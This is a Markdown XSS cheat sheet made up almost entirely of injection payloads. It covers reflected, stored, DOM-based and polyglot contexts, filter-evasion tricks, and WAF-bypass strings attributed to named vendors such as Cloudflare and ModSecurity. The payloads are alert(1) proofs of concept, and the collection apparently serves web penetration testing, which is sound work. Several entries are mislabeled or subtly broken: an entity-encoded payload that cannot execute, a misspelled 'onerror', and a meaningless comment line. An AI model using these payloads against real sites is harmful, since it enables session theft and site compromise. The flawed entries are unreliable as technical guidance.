# XSS Reference

Cross-Site Scripting (XSS) payload categories and bypass techniques.

## Reflected XSS

Basic reflected payloads for different contexts:

```
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">
```

### Context-Aware Payloads

**HTML Context (unquoted attribute)**:
```
onmouseover=alert(1)
```

**HTML Context (double-quoted attribute)**:
```
" onmouseover="alert(1)
```

**HTML Context (single-quoted attribute)**:
```
' onmouseover='alert(1)
```

**Inside `<style>` tag**:
```
</style><script>alert(1)</script>
```

**Inside `<script>` tag**:
```
</script><script>alert(1)</script>
```

## Stored XSS

Payloads designed for persistent storage:

```
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x alt="</textarea><script>alert(1)</script>">
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## DOM-Based XSS

**URL-based DOM injection**:
```
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
```

**DOM manipulation sinks**:
```
#<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
'><script>alert(1)</script>
```

## Polyglot Payloads

Multi-context XSS payloads:

```
jaVasCript:/*/*--></noscript><svg/onload=alert(1)//*/
/*"></option></select><style></style><script>alert(1)//*/
```

```
<svg/onload=alert(1)>
<!--(select)(select)(select)-->
```

## Filter Bypass Techniques

**Case variation**:
```
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>
```

**Mixed case encoding**:
```
<script%3ealert(1)%3c/script%3e
```

**HTML entity encoding**:
```
&lt;script&gt;alert(1)&lt;/script&gt;
```

**Unicode escaping**:
```
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**Null byte injection**:
```
<script%00>alert(1)</script%00>
```

**Line break bypass**:
```
<scri\
pt>ale\
rt(1)</scri\
pt>
```

## WAF Bypass Variants

**Amazon WAF bypass**:
```
<script%0d%0a>alert(1)</script>
```

**Cloudflare bypass**:
```
<svg%0aonload=alert(1)>
<iframe%0asrc=javascript:alert(1)>
```

**ModSecurity bypass**:
```
<img/src=x%0alonerror=alert(1)>
<body%0aonload=alert(1)>
```

**Imperva/Akamai bypass**:
```
<svg%09onload=alert(1)>
<svg%0aonload=alert(1)>
<svg%0donload=alert(1)>
```

## Event Handlers

Full list of available event handlers for XSS:

```
onload, onerror, onclick, onmouseover, onmouseout, onfocus, onblur
onchange, onsubmit, onreset, onselect, onkeydown, onkeypress, onkeyup
ondblclick, ondrag, ondrop, oncopy, oncut, onpaste
onscroll, onwheel, oncopy, onpaste, onbeforeunload
```

## Common Encoding Reference

| Original | URL Encoded | HTML Entity |
|----------|-------------|-------------|
| `<` | `%3C` | `&lt;` |
| `>` | `%3E` | `&gt;` |
| `"` | `%22` | `&quot;` |
| `'` | `%27` | `&#x27;` |
| `(` | `%28` | `&#40;` |
| `)` | `%29` | `&#41;` |